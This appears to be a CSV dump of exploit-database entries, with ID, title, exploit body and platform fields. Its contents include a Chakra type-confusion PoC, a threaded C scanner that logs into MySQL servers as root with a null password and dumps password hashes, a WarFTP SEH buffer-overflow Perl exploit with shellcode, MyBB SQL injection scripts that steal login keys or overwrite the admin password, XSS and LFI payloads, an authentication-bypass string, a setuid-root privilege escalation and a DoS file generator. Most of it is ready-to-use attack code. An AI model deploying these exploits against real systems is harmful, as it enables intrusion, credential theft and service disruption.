45215,"Microsoft Edge Chakra JIT - 'DictionaryPropertyDescriptor::CopyFrom' Type Confusion /* Here's the method.     template <typename TPropertyIndex>     template <typename TPropertyIndexFrom>     void DictionaryPropertyDescriptor<TPropertyIndex>::CopyFrom(DictionaryPropertyDescriptor<TPropertyIndexFrom>& descriptor)     {         this->Attributes = descriptor.Attributes;         this->Data = (descriptor.Data == DictionaryPropertyDescriptor<TPropertyIndexFrom>::NoSlots) ? NoSlots : descriptor.Data;         this->Getter = (descriptor.Getter == DictionaryPropertyDescriptor<TPropertyIndexFrom>::NoSlots) ? NoSlots : descriptor.Getter;         this->Setter = (descriptor.Setter == DictionaryPropertyDescriptor<TPropertyIndexFrom>::NoSlots) ? NoSlots : descriptor.Setter;         this->IsAccessor = descriptor.IsAccessor;  #if ENABLE_FIXED_FIELDS         this->IsInitialized = descriptor.IsInitialized;         this->IsFixed = descriptor.IsFixed;         this->UsedAsFixed = descriptor.UsedAsFixed; #endif     }  Given its name, I think that the method is supposed to copy all the fields from another descriptor to ""this"". But it actually leaves some fields uncopied. The ""IsShadowed"" field is one of them which indicates that a Let or Const variable has been declared in the global object with the same name as the name of a property of the global object. This lack of copying the ""IsShadowed"" field can lead to type confusion like in the PoC or uninitialized pointer dereference.  PoC: */  let x = 1;  this.x = 0x1234;  // IsShadowed  // Convert to BigDictionaryTypeHandler, CopyFrom will be used in the process. for (let i = 0; i < 0x10000; i++) {     this['a' + i] = 1; }  // Set IsAccessor this.__defineSetter__('x', () => {});  // Type confusion this.x;",local,dos,1
21726,"MySQL 3.20.32/3.22.x/3.23.x - Null Root Password Weak Default Configuration (2) /* source: https://www.securityfocus.com/bid/5503/info   MySQL is is an open source relational database project, and is available for a number of operating systems, including Microsoft Windows.   A weak default configuration problem has been reported in the Windows binary release of MySQL. Reportedly, the root user of the database is defined with no password, and granted login privileges from any host.   This issue has been reported in the Windows binary release of MySQL. Other versions may share this default configuration, this has not however been confirmed. */  /* Program: finger_mysql.c Original Date: October 5, 2002 Version 1.0 Platform: Linux (Compiled on SuSE 7.3 Pro) c0der: st0ic Web: www.fsix.net email: st0ic@fsix.net  Revisions: 	NONE Thus Far  Compile: 	st0ic~# gcc -lpthread -lmysqlclient finger_mysql.c -o finger_mysql  Description: This is a MySQL Class C IP scanner that finds vulnerable MySQL daemons and attempts to login under the default root account with a NULL password. After login, this program will dump the usernames, encrypted password hash and the hostnames in the mysql.user table.  Other information: The original idea for this came from mysqlfuck.c by g0th. I ran across module's pscan.c code and decided it was elite... so I modified it to work with this program. Those two pieces of code resulted in this piece of code. See http://www.securiteam.com/securitynews/5GP0K0A81Y.html or http://online.securityfocus.com/bid/5503 . Also, if you make too many connects to the MySQL daemon without issuing any commands, depending on the settings, you could be blocked. This program will make 1 bad connect that will count against you, so be careful when using it. If you are blocked the admin of the MySQL daemon will have to do a flush-hosts in order for you to be able to connect again; See http://www.mysql.com/doc/en/Blocked_host.html for more info. If your looking to test out how good the encrypted passwords are, you can use this: http://www.securiteam.com/tools/5YP0H0A40O.html . If you have problems with that, try to comment out the lines that contain this stuff:  printf(""(%li)\t[0x%02x,0x%02x,0x%02x,0x%02x,0x%02x,0x%02x,0x%02x,0x%02x,0x%0  2x,0x%02x]\t[%s]  [%s]!=[%s]\n"",attempts,hash[0],hash[1],hash[2],hash[3],hash[4],hash[5],hash[  6],hash[7],hash[8],hash[9],temp,to,password);  That will probably get it to work without seg faulting.  Disclaimer: Yeah, this is for educational purposes. I wrote this to test out your own MySQL daemons and their passwords. Don't go trying it out on other people's servers and try to be l33t. */  #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/types.h> #include <sys/time.h> #include <sys/socket.h> #include <netdb.h> #include <netinet/in.h> #include <arpa/inet.h> #include <pthread.h> #include <string.h> #include <errno.h> #include <fcntl.h> #include <mysql/mysql.h> /* might need to play with this */  #define MAXHOSTS 254 #define TIMEOUT 20 /* connection timeout in seconds */  /* mysql stuff */ #define db ""mysql"" #define user ""root"" #define pass NULL #define query ""SELECT user,password,host FROM user;""  /* add some color to you life */ /* ---> type <--- */ #define RESET           0 #define BRIGHT          1 #define DIM             2 #define UNDERLINE       3 #define BLINK           4 #define REVERSE         7 #define HIDDEN          8  /* ---> text color <-- */ #define BLACK           0 #define RED             1 #define GREEN           2 #define YELLOW          3 #define BLUE            4 #define MAGENTA         5 #define CYAN            6 #define WHITE           7 #define DEFAULT		8 /* not valid, so it reverts to default, hopefully. */  char hosts[MAXHOSTS][17]; int sockfd[MAXHOSTS];  struct c_info { 	char *hostname; 	unsigned short int port; };  void textcolor(int attr, int text, int bg); void check_ip(char ip_tmp[]); void parse_ip(char *ip); void start_threads(char *ip, unsigned short int port); void scan_host(struct c_info *); void finger_mysql(char *hostname, unsigned short int port);  void textcolor(int attr, int text, int bg) {       char command[13];          /* Command is the control command to the terminal */         sprintf(command, ""%c[%d;%d;%dm"", 0x1B, attr, text + 30, bg + 40);         fprintf(stderr, ""%s"", command); /* lets color stderr! */ }  int main(int argc, char *argv[]) { 	char *ip, ip_tmp[32]; 	unsigned short int port = 3306; /* mysql default port */ 	 	setvbuf(stdout, NULL, _IONBF, 0); 	textcolor(BRIGHT, RED, BLACK); 	fprintf(stderr, ""\n\t[   finger_mysql.c  ]""); 	fprintf(stderr, ""\n\t[      by st0ic     ]""); 	fprintf(stderr, ""\n\t[      Fsix.Net     ]""); 	textcolor(BRIGHT, BLUE, BLACK); 	fprintf(stderr, ""\n\n\t---> Don't Be Scer'ed!\n\n""); 	textcolor(RESET, DEFAULT, DEFAULT); 	 	if (argc < 2 || argc > 3) 	{ 		fprintf(stderr, ""usage: %s <ip> [port]\n"", argv[0]); 		fprintf(stderr, ""\t ip\t Required. C Class IP to scan (ex. 10.219.1.).\n""); 		fprintf(stderr, ""\t port\t Optional. MySQL port to connect to (ex. 3306).\n""); 		fprintf(stderr, ""\t Examples: %s 192.168.1. 3306\n"", argv[0]); 		fprintf(stderr, ""\t           %s 192.168.1. > dump.txt\n\n"", argv[0]); 		exit(1); 	} 	ip = argv[1]; 	sprintf(ip_tmp, ""%s"", ip); 	if (argv[2] != NULL) 		port = ((unsigned short int)atoi(argv[2])); 	bzero(&sockfd, sizeof(sockfd)); 	 	check_ip (ip_tmp); 	parse_ip (ip); 	start_threads(ip, port); 	 	return 0; }  void check_ip (char ip_tmp[]) { 	char *split_ip; 	char *split_nums[3]; 	int x, c; 	char *original_ip; 	 	original_ip = ip_tmp; 	 	split_ip = strtok(ip_tmp, "".""); 	split_nums[0] = split_ip; 	split_ip = strtok(NULL, "".""); 	split_nums[1] = split_ip; 	split_ip = strtok(NULL, "".""); 	split_nums[2] = split_ip; 	 	for (x = 0; x < 3; x++) 	{ 		c = atoi(split_nums[x]); 		if ((c > 255) || (c < 1)) 		{ 			fprintf(stderr, ""\nSyntax error in IP range -- %s"", ip_tmp); 			fprintf(stderr, ""\n\tValid ranges are 1 - 254\n""); 			exit(1); 		} 	} }  void parse_ip (char *ip) { 	int x; 	for (x = 0; x < 254; x++) 		sprintf(hosts[x], ""%s%d"", ip, x+1); }  /* this is module's original function, almost unmodified */ void start_threads (char *ip, unsigned short int port) { 	int i = 0, s, res, fd_amnt, j = 0; 	char buff[100]; 	pthread_t p_thread[MAXHOSTS]; 	struct c_info scanme[MAXHOSTS];  	 	bzero(scanme, sizeof(scanme));   	fprintf(stderr, ""Beginning scan of %sx\n"", ip); 	fprintf(stderr, ""when you've had enough of the scanning, hit ^C (CONTROL+C)\n""); 	fprintf(stderr, ""Connection TIMEOUT = %d seconds\n"", TIMEOUT); 	 	fd_amnt = (getdtablesize()-1); 	fprintf(stderr, ""Using max file descriptors: %d\n\n"", fd_amnt); 	 	for(i = 0; i < ((sizeof(hosts))/(sizeof(hosts[i]))); i++)        	{ 		for(s=0; s < fd_amnt && i < MAXHOSTS; s++,i++)  		{ 			scanme[i].port = port; 			scanme[i].hostname = hosts[i];    			res = pthread_create(&p_thread[i],NULL,(void *)&scan_host, 				(struct c_info *)&scanme[i]);      			 			if(res == EAGAIN) 			{ 				printf(""pthread_create: ran out of resources at %d iteration\n"", i); 				exit(0); 			} 			usleep(1000); 		} 		 		/* wait for the deployed threads to return */ 		sleep(1); 		for(s=0; s < fd_amnt && j < MAXHOSTS; s++, j++) 		{ 			pthread_join(p_thread[j], NULL); 		} 	}                      } /* Another function written by module. I modified the shit outa it in order to get it to work how I wanted it to :-). */ void scan_host (struct c_info *scanme) { 	int *fd,i,l,c,err; 	fd_set wr; 	struct c_info *scanme_ptr; 	struct sockaddr_in sa; 	struct timeval tv;    	scanme_ptr = (struct c_info *) scanme; 	/* find a socket to use */ 	for(i = 0;i < MAXHOSTS; i++) 	{ 		if(!sockfd[i]) 		{ 			fd = &sockfd[i]; 			break; 		 } 	}      	if((*fd = socket(AF_INET,SOCK_STREAM,IPPROTO_IP)) == (-1)) 	{ 		perror(""\nsocket""); 		exit(-1); 	}  	bzero(&sa, sizeof(sa)); 	bzero(&tv, sizeof(tv));  	sa.sin_port   = htons(scanme_ptr->port); 	sa.sin_family = AF_INET;    	tv.tv_sec     = TIMEOUT; 	tv.tv_usec    = 0;     	if(!inet_aton(scanme_ptr->hostname,&sa.sin_addr)) 	{    		fprintf(stderr,""inet_aton error\n""); 		pthread_exit(0); 	}      	/* start non-blocking on socket */ 	if((fcntl(*fd,F_SETFL,O_NONBLOCK))==(-1)) 	{ 		fprintf(stderr,""fcntl error\n""); 		pthread_exit(0); 	} 	 	/* try to make an inital connection to the host */ 	if((c = connect(*fd, (struct sockaddr *)&sa, sizeof(sa)))==(-1)) 	{ 		if(errno != EINPROGRESS) 		{ 			close(*fd); 			/*printf(""connect didnt have EINPROGRESS""); */ 			pthread_exit(0); 		} 	} 	else if (c == 0) 	{ 		printf(""\t[%s]\tMySQLD running on port %d\n"",  			scanme_ptr->hostname, scanme_ptr->port); 		pthread_exit(0); 	}  	l = sizeof(err); 	 	/* check the socket for writing. */ 	FD_SET(*fd,&wr); 	 	if((c=select(*fd+1,NULL,&wr,NULL, &tv))==(0))      	{ 		close(*fd); 		/*printf(""select for wr on connect() timeout"");*/ 		pthread_exit(0); 	} 	else if(c == (-1)) /* redundant */ 	{ 		close(*fd);    /* for some generic select() error */ 		/*printf(""generic select error for connect() wr"");*/ 		pthread_exit(0); 	}      	/* use getsockopt() to see if we connected successfully */ 	getsockopt(*fd,SOL_SOCKET,SO_ERROR,&err,&l);  	/* printf(""sockopt: %d on %s\n"",err,scanme_ptr->hostname);*/     	/* lets see what we have to work with now */ 	if(err == ECONNREFUSED) 	{      		close(*fd);                 		/*printf(""connection refused at %s\n"",scanme_ptr->hostname);*/ 		pthread_exit(0); 	} 	else if(err == EHOSTUNREACH) 	{ 		close(*fd);                               		/*printf(""host unreachable at %s"",scanme_ptr->hostname);*/ 		pthread_exit(0); 	} 	textcolor(BRIGHT, RED, BLACK); 	fprintf(stderr, ""\t[%s]\tMySQLD running on port %d\n"", 		scanme_ptr->hostname, scanme_ptr->port); 	textcolor(RESET, DEFAULT, DEFAULT); 	 	close(*fd); 	 	finger_mysql(scanme_ptr->hostname, scanme_ptr->port); 	 	pthread_exit(0); }  void finger_mysql(char *hostname, unsigned short int port) { 	MYSQL *conn; 	MYSQL_RES *result; 	MYSQL_ROW row; 	MYSQL_FIELD *field; 	unsigned int i, j, col_length; 	 	conn = mysql_init(NULL); 	if (conn == NULL) 	{ 		printf(""mysql_init() failed\n""); 		pthread_exit(0); 	} 	if (mysql_real_connect(conn, hostname, user, pass,  		db, port, NULL, 0) == NULL) 	{ 		/*fprintf(stderr, ""[%s] ERROR: mysql_real_connect error:\n\tError %u (%s)\n"",  			hostname, mysql_errno(conn), mysql_error(conn));*/ 		pthread_exit(0); 	} 	textcolor(BRIGHT, BLUE, BLACK); 	fprintf(stderr, ""\t---> [%s] Successful login\n"", hostname); 	textcolor(RESET, DEFAULT, DEFAULT); 	if (mysql_query(conn, query) != 0) 	{ 		/*fprintf(stderr, ""[%s] ERROR: mysql_query() failed:\n\tError %u (%s)\n"",  			hostname, mysql_errno(conn), mysql_error(conn));*/ 		mysql_close(conn); 		pthread_exit(0); 	} 	if ((result = mysql_store_result(conn)) == NULL) 	{ 		/*fprintf(stderr, ""[%s] ERROR: mysql_store_result() failed:\n\tError %u (%s)\n"",  			hostname, mysql_errno(conn), mysql_error(conn));*/ 		mysql_close(conn); 		pthread_exit(0); 	} 	 	printf(""USER | PASSWORD | HOST for %s:\n"", hostname); 	 	/* attempt to print pretty output... not as good as the mysql client's though :-( */ 	mysql_field_seek(result, 0); 	for (i = 0; i < mysql_num_fields(result); i++) 	{ 		field = mysql_fetch_field(result); 		col_length = strlen(field->name); 		if (col_length < field->max_length) 			col_length = field->max_length; 		if (col_length < 4 && !IS_NOT_NULL (field->flags)) 			col_length = 4; /* length of the word ""NULL"" */ 		field->max_length = col_length; 	} 	mysql_field_seek (result,0); 	fputc ('+', stdout); /* header stuff */ 	for (i = 0;i < mysql_num_fields(result);i++) 	{ 		field = mysql_fetch_field (result); 		for (j = 0;j < field->max_length + 2;j++) 			fputc ('-', stdout); 		fputc ('+', stdout); 	} 	fputc ('\n', stdout); /* columns/rows for data */ 	while ((row = mysql_fetch_row (result))!=NULL) 	{ 		mysql_field_seek (result, 0); 		fputc ('|', stdout); 		for (i =0; i < mysql_num_fields(result);i++) 		{ 			field = mysql_fetch_field (result); 			if (row [i] == NULL) 				printf ("" %-*s |"",field->max_length, NULL  ); 			else if (IS_NUM (field->type)) 				printf ("" %*s |"",field->max_length,row [i ]); 			else 				printf ("" %-*s |"",field->max_length,row [i ]); 		} 		fputc ('\n', stdout); 	} 	mysql_close(conn); 	free(conn); }",remote,remote,1
47221,"UNA 10.0.0 RC1 - 'polyglot.php' Persistent Cross-Site Scripting # Exploit Title: [UNA - 10.0.0-RC1 stored XSS vuln.] # Date: [2019 08 10] # Exploit Author: [Greg.Priest] # Vendor Homepage: [https://una.io/] # Software Link: [https://github.com/unaio/una/tree/master/studio] # Version: [UNA - 10.0.0-RC1] # Tested on: [Windows/Linux ] # CVE : [CVE-2019-14804]  UNA-v.10.0.0-RC1 [Stored XSS Vulnerability]#1   Sign in to admin and look for the [""etemplates""] page (/studio/polyglot.php?page=etemplates)!  Click [""Emails""] and edit the templates! Inject the JavaScript code into the [""System Name""] field!    http://127.0.0.1/UNA/studio/polyglot.php?page=etemplates   https://github.com/Gr3gPr1est/BugReport/blob/master/CVE-2019-14804.pdf",remote,webapps,1
35309,Betsy 4.0 - 'page' Local File Inclusion source: https://www.securityfocus.com/bid/46124/info  Betsy is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to obtain potentially sensitive information and to execute arbitrary local scripts in the context of the webserver process. This may allow the attacker to compromise the application and the computer; other attacks are also possible.  Betsy 4.0 is vulnerable; other versions may also be affected.   http://www.example.com/ress.php?page=[LFI],local,webapps,0
17961,"MyBB Advanced Forum Signatures - 'afsignatures-2.0.4' SQL Injection ﻿--------------------------------------------------------------------- Exploit Title : MyBB Advanced Forum Signatures (afsignatures-2.0.4) ---------------------------------------------------------------------  Author      : Mario_Vs Date        : 10/10/2011 Site        : http://mariovs.pl/ @  	    : mario_vs[at]o2.pl ---------------------------------------------------------------------  Description >  Vendor 	    : http://mods.mybb.com/download/advanced-forum-signatures Tested On   : Windows 7 ---------------------------------------------------------------------  SQL Injection  >> signature.php  POST -> afs_html=<a+href=""http://localhost/mybb""><img+src=""http://localhost/mybb/signature.php?uid=1""+alt=""""+/></a>&afs_bbcode=[url=http://localhost/mybb][img]http://localhost/mybb/signature.php?uid=1[/img][/url]&afs_type=bar&afs_background=Default_Blue&afs_showonline=1&afs_full_line1=username&afs_full_line2=usergroup&afs_full_line3=postcount&afs_full_line4=registrationdate&afs_full_line5=reputation&afs_full_line6=blank&afs_bar_left=username&afs_bar_center=usergroup&afs_bar_right=postcount' , `password`= '65a1447de8e73ae67a938ae997ad4ed4', `salt`= 'NPOvUCXg'  WHERE `uid`='1';--  ---------------------------------------------------------------------  ---------------------------------------------------------------------  Greets To: linc0ln.dll, j4ck, lDoran, ElusiveN, d3dik, thc_flow, PricK, artii2  All users: HackinQ.pl",remote,webapps,1
3482,"WarFTP 1.65 (Windows 2000 SP4) - 'USER' Remote Buffer Overflow (Perl) # =============================================================================================== #                   WarFTP 1.65 (USER) Remote Buffer Overflow SEH overflow Exploit #                               By Umesh Wanve # =============================================================================================== #  # Date : 15-03-2007 # # Tested on Windows 2000 SP4 Server English #           Windows 2000 SP4 Professional English # # You can replace shellcode with your favourite one :) # #  # Well I used different technique here. Rather than overwriting EIP, I used SEH handler overwrite  # method. Preety simple.  # # Stack --->      buffer                       ===  AAAAA......... #                   | #            Pointer to next SEH               ===  Short Jump to Hellcode   #                   | #               SEH Handler                    ===  Pop, Pop, Ret (ws2help.dll win2000 sp4) #                   | #                NOP Sled                      ===  Nop Sled #                   |  #                Hellcode                      ===  Hell......... #  # # # # P.S: This was written for educational purpose. Use it at your own risk.Author will be not be  #      responsible for any damage. #   # Always Thanks to Metasploit.  # #================================================================================================== #!/usr/bin/perl  use IO::Socket; #use strict;  # win32_exec - EXITFUNC=seh CMD=calc Size=330 Encoder=Alpha2 http://metasploit.com  my($shellcode)= ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"". ""\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x49\x49\x51\x5a\x6a\x42"". ""\x58\x50\x30\x41\x31\x42\x41\x6b\x41\x41\x52\x32\x41\x42\x41\x32"". ""\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x38\x69\x79\x6c\x4a"". ""\x48\x67\x34\x47\x70\x77\x70\x53\x30\x6e\x6b\x67\x35\x45\x6c\x4c"". ""\x4b\x73\x4c\x74\x45\x31\x68\x54\x41\x68\x6f\x6c\x4b\x70\x4f\x57"". ""\x68\x6e\x6b\x71\x4f\x45\x70\x65\x51\x5a\x4b\x67\x39\x4c\x4b\x50"". ""\x34\x4c\x4b\x77\x71\x68\x6e\x75\x61\x4b\x70\x4e\x79\x6e\x4c\x4d"". ""\x54\x4b\x70\x72\x54\x65\x57\x69\x51\x49\x5a\x46\x6d\x37\x71\x6f"". ""\x32\x4a\x4b\x58\x74\x77\x4b\x41\x44\x44\x64\x35\x54\x72\x55\x7a"". ""\x45\x6c\x4b\x53\x6f\x51\x34\x37\x71\x48\x6b\x51\x76\x4c\x4b\x76"". ""\x6c\x50\x4b\x6e\x6b\x71\x4f\x67\x6c\x37\x71\x68\x6b\x4c\x4b\x65"". ""\x4c\x4c\x4b\x64\x41\x58\x6b\x4b\x39\x53\x6c\x75\x74\x46\x64\x78"". ""\x43\x74\x71\x49\x50\x30\x64\x6e\x6b\x43\x70\x44\x70\x4c\x45\x4f"". ""\x30\x41\x68\x44\x4c\x4e\x6b\x63\x70\x44\x4c\x6e\x6b\x30\x70\x65"". ""\x4c\x4e\x4d\x6c\x4b\x30\x68\x75\x58\x7a\x4b\x35\x59\x4c\x4b\x4d"". ""\x50\x58\x30\x37\x70\x47\x70\x77\x70\x6c\x4b\x65\x38\x57\x4c\x31"". ""\x4f\x66\x51\x48\x76\x65\x30\x70\x56\x4d\x59\x4a\x58\x6e\x63\x69"". ""\x50\x31\x6b\x76\x30\x55\x38\x5a\x50\x4e\x6a\x36\x64\x63\x6f\x61"". ""\x78\x6a\x38\x4b\x4e\x6c\x4a\x54\x4e\x76\x37\x6b\x4f\x4b\x57\x70"". ""\x63\x51\x71\x32\x4c\x52\x43\x37\x70\x42"";  my($pointer_to_next_seh)=""\xeb\x06\x90\x90"";                  # Short Jump  my($seh_handler)=""\xa9\x11\x02\x75"";                          #pop, pop, ret                                                                #(ws2help.dll win2000 sp4)     if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],  PeerPort => ""21"",   Proto    => ""TCP"")) {                  		     $exploit  = ""USER "".                          #Vulnerable Command                                                        (""A""x485).                        #Buffer                               ""BBBB"".                           #EIP Overwrites here :)                              (""\x90"" x 80).                    #Garbage 				     $pointer_to_next_seh.                                          $seh_handler.                              (""\x90"" x 10).                              $shellcode. 				   #ur code	                              (""\x90"" x 10).                              ""\r\n"";                   		     print $socket $exploit;                   sleep(1); 			                                  close($socket); } else {                  print ""Cannot connect to $ARGV[0]:21\n""; }  # milw0rm.com [2007-03-15]",remote,remote,1
1548,"MyBulletinBoard (MyBB) 1.04 - 'misc.php' SQL Injection (2) #!/usr/bin/perl -w  # MyBB <= 1.04 (misc.php COMMA) Remote SQL Injection Exploit 2 , Perl C0d3 # # Milw0rm ID :- #			http://www.milw0rm.com/auth.php?id=1539 # D3vil-0x1 | Devil-00 < BlackHat > :) # # DONT FORGET TO DO YOUR CONFIG !! # DONT FORGET TO DO YOUR CONFIG !! # DONT FORGET TO DO YOUR CONFIG !! use IO::Socket;  ##-- Start --#  $host 	= ""127.0.0.1""; $path		= ""/mybb3/""; $userid	= 1; $mycookie 	= ""mybbuser=1_xommhw5h9kZZGSFUppacVfacykK1gnd84PLehjlhTGC1ZiQkXr;"";  ##-- _END_ --## #	$host		:- #				The Host Name Without http:// | exm. www.vic.com # #	$path		:- #				MyBB Dir On Server | exm. /mybb/ # #	$userid	:- #				The ID Of The User U Wanna To Get His Loginkey # #	$cookie	:- #				You Must Register Username And Get YourCookies ( mybb_user ) Then But it Like This #	 #				$cookie 	= ""mybbuser=[YourID]_[YourLoginkey];""; $sock = IO::Socket::INET->new ( 										PeerAddr => ""$host"", 										PeerPort	=> ""80"", 										Proto		=> ""tcp"" 										) or die(""[!] Connect To Server Was Filed""); ##-- DONT TRY TO EDIT ME --##										 $evilcookie = ""comma=0)%20%3C%3E%200%20UNION%20ALL%20SELECT%201,loginkey,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,1 FROM mybb_users WHERE uid=$userid/*;""; ##-- DONT TRY TO EDIT ME --##						 $evildata  = ""GET "".$path.""misc.php?action=buddypopup HTTP/1.1\n""; $evildata .= ""Host: $host \n""; $evildata .= ""Accept: */* \n""; $evildata .= ""Keep-Alive: 300\n""; $evildata .= ""Connection: keep-alive \n""; $evildata .= ""Cookie: "".$mycookie."" "".$evilcookie.""\n\n"";  print $sock $evildata;  while($ans = <$sock>){ 	$ans =~ m/<a href=\""member.php\?action=profile&amp;uid=1\"" target=\""_blank\"">(.*?)<\/a><\/span><\/td>/ && print ""[+] Loginkey is :- "".$1.""\n""; }  # milw0rm.com [2006-03-03]",remote,webapps,1
47569,"TheJshen contentManagementSystem 1.04 - 'id' SQL Injection # Exploit Title: TheJshen contentManagementSystem 1.04 - 'id' SQL Injection # Date: 2019-11-01 # Exploit Author: Cakes # Vendor Homepage: https://github.com/thejshen/contentManagementSystem # Version: 1.04 # Software Link: https://github.com/thejshen/contentManagementSystem.git # Tested on: CentOS7  # GET parameter 'id' easy SQL Injection --- Parameter: id (GET)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause     Payload: id=4' AND 5143=5143-- OWXt     Vector: AND [INFERENCE]      Type: time-based blind     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)     Payload: id=4' AND (SELECT 4841 FROM (SELECT(SLEEP(5)))eqmp)-- ZwTG     Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])      Type: UNION query     Title: Generic UNION query (NULL) - 5 columns     Payload: id=-4903' UNION ALL SELECT NULL,NULL,CONCAT(0x716a706b71,0x66766f636c546750775053685352676c4f70724d714c4b64494e755252765a626370615a565a4b49,0x717a6a7671),NULL,NULL-- hkoh     Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]",remote,webapps,1
28257,"GnuPG 1.4/1.9 - Parse_Comment Remote Buffer Overflow source: https://www.securityfocus.com/bid/19110/info  GnuPG is prone to a remote buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.  This issue may allow remote attackers to execute arbitrary machine code in the context of the affected application, but this has not been confirmed.  GnuPG version 1.4.4 is vulnerable to this issue; previous versions may also be affected.  perl -e 'print ""\xfd\xff\xff\xff\xff\xfe""'| /var/gnupg/bin/gpg --no-armor",remote,dos,1
28989,"INFINICART - 'search.asp?search' Cross-Site Scripting source: https://www.securityfocus.com/bid/21043/info  Infinicart is prone to multiple input-validation vulnerabilities, including HTML-injection and SQL-injection issues, because the application fails to properly sanitize user-supplied input.  A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.  The vendor reports that these issues affect only the demonstration version of Infinicart and do not affect any official released versions of the application.  in /infinicart-demo/search.asp : post the following search = &lt;/textarea&gt;&#039;""><script>alert(document.cookie)</script>",remote,webapps,1
7319,"Ocean12 Mailing List Manager Gold - File Disclosure / SQL Injection / Cross-Site Scripting ######################################################### --------------------------------------------------------- Portal Name: Ocean12 Mailing List Manager Gold Vendor : http://ocean12tech.com/products/o12mailgold Author : Pouya_Server , Pouya.s3rver@Gmail.com Vulnerability : (DD,SQL,XSS) --------------------------------------------------------- ######################################################### [DD]: http://site.com/[Path]/o12mail.mdb [SQL]: http://site.com/[Path]/s_edit.asp?email=[SQL] http://site.com/[Path]/default.asp?Page=2&Email='[SQL] [XSS]: http://site.com/[Path]/default.asp?Error=Pouya_Server&Name=&Email=Pouya.s3rver@gmail.com""><ScRiPt%20%0a%0d>alert(1369)%3B</ScRiPt>  --------------------------------- Victem : http://ocean12tech.com/products/o12mailgold/demo  # milw0rm.com [2008-12-02]",remote,webapps,1
41099,"Dentist Website Script - SQL Injection # # # # #  # Vulnerability: SQL Injection + Authentication Bypass # Date: 18.01.2017 # Vendor Homepage: http://www.scriptgiant.com/ # Script Name: Dentist Website Script # Script Buy Now: http://www.popularclones.com/products/Dentist-Website-Script # Author: Ihsan Sencan # Author Web: http://ihsan.net # Mail : ihsan[beygir]ihsan[nokta]net # # # # # # Authentication Bypass : # http://localhost/[PATH]/admin_giant/ and set Username:'or''=' and Password to 'or''=' and hit enter. # SQL Injection/Exploit : # http://localhost/[PATH]/admin_giant/add_gallery.php?id=[SQL] # http://localhost/[PATH]/admin_giant/client.entry.php?id=[SQL] # E.t.c.... Other files, too. SQL There are security vulnerabilities. # # # # #",remote,webapps,1
680,"Apple Mac OSX Adobe Version Cue - Local Privilege Escalation (Bash) Proof of concept:  haven:~ fintler$ cd ~ haven:~ fintler$ id uid=502(fintler) gid=500(fintler) groups=500(fintler) haven:~ fintler$ echo ""cp /bin/sh /Users/$USER;chmod 4755 /Users/$USER/sh;chown root /Users/$USER/sh"" > productname.sh haven:~ fintler$ chmod 0755 ./productname.sh haven:~ fintler$ ln -s /Applications/Adobe\ Version\ Cue/stopserver.sh . haven:~ fintler$ ./stopserver.sh Stopping  ...  ./stopserver.sh: line 21: ./tomcat/bin/shutdown.sh: No such file or directory No matching processes belonging to you were found haven:~ fintler$ ./sh sh-2.05b# id uid=502(fintler) euid=0(root) gid=500(fintler) groups=500(fintler) sh-2.05b# whoami root sh-2.05b#  # milw0rm.com [2004-12-08]",local,local,1
8465,"Microsoft Media Player - 'quartz.dll .mid' Denial of Service #! /usr/bin/perl # CAL_quartz_mid_poc.pl # # MircoSoft_Media_player_quartz.dll_mid_remote_Dos POC # by Code Audit Labs public 2009-04-17 # http://www.vulnhunt.com/ # #Affected #======== #test on full updated winxp sp3 #windows media Player 10.00.00.3998 quartz.dll 6.5.3790.4283 #Windows Media Player 11.0.5721.5230 quartz.dll 6.5.2600.5596  #other version should be affected  # CVE: please assign to this a CVE id  # #ANALYSIS #======== #  one vulnerability exists within the quartz.dll code processing RMID header #the struct have following #{ #  char riff_id[4]; //'RIFF' #  DWORD rmid_size; #  char rmid_id[4]; //'RMID' #  char data_id[4]; //no eq data #  DWORD midi_size;  #} #if  data_id is not 'data' , and midi_size is 0xfffffff8. #the code would fall into infinity loop.  #  open(Fin, "">poc.mid"") || die ""can't create crash sample.$!""; binmode(Fin); $data =   ""\x52\x49\x46\x46\xff\xff\x00\x00\x52\x4d\x49\x44\x64\x64\x64\x64"" . ""\xf8\xff\xff\xff\x4d\x54\x68\x64\xff\xff\xff\xff\xf8\xff\xff\xf8"" . ""\xf8\xff\xff\xff\xf7\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"" . ""\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"" . ""\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"";  print Fin $data;  close(Fin);  # milw0rm.com [2009-04-17]",remote,dos,1
40200,"NUUO NVRmini2 / NVRsolo / Crystal Devices / NETGEAR ReadyNAS Surveillance Application - Multiple Vulnerabilities >> Multiple vulnerabilities in NUUO NVRmini2 / NVRsolo / Crystal devices and NETGEAR ReadyNAS Surveillance application >> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security (http://www.agileinfosec.co.uk/) ========================================================================== Disclosure: 04/08/2016 / Last updated: 04/08/2016   >> Background on the affected products: ""NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS functionality. Setup is simple and easy, with automatic port forwarding settings built in. NVRmini 2 supports POS integration, making this the perfect solution for small retail chain stores. NVRmini 2 also comes full equipped as a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping and RAID functions for data protection. Choose NVR and know that your valuable video data is safe, always."" 